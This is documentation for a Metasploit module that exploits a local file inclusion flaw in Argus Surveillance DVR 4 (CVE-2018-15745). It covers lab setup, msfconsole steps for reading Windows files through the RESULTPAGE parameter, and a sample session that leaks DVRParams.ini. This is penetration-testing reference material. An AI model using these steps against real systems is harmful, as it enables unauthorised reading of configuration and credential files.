## Vulnerable Application
This module leverages an issue with how the `RESULTPAGE` parameter within `WEBACCCOUNT.cgi` handles file referencing and as a result is vulnerable to Local File Inclusion (LFI). 

## Options
To successfully read contents of the Windows file system you must set the full file path of the file you want to check using `TARGET_FILE` (not including the drive letter prefix). 
As a first run it is recommended to try leaking `Windows/system.ini` as a validation exercise on your first module run.

## Testing
To setup a test environment, the following steps can be performed:
1. Set up a Windows operating system (any OS that has C:\Windows\system.ini)
2. Download the [Argus DVR 4 Software](https://download.cnet.com/argus-surveillance-dvr/3000-2348_4-10576796.html)
3. Run the Argus software and a webpage running on port 8080 will appear. Take note of the machine's IP
4. On your attacker machine follow the verification steps below.

## Verification Steps
1. start msfconsole
2. `use auxiliary/gather/argus_dvr4_lfi_cve_2018_15745`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set TARGET_FILE Windows/system.ini`
5. `run`

## Scenarios
### Utilising Argus DVR 4 CVE-2018-15745 to Leak DVRParams.ini
```
msf6 > use auxiliary/gather/argus_dvr_4_lfi_cve_2018_15745 
msf6 auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > set RHOSTS 192.168.1.15
RHOSTS => 192.168.1.15
msf6 auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > set TARGET_FILE ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini
TARGET_FILE => ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini
msf6 auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > run
[*] Running module against 192.168.1.15
[*] Sending request to 192.168.1.15:8080 for file: ProgramData/PY_Software/Argus%20Surveillance%20DVR/DVRParams.ini
[+] File retrieved successfully!
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked

[*] Auxiliary module execution completed

```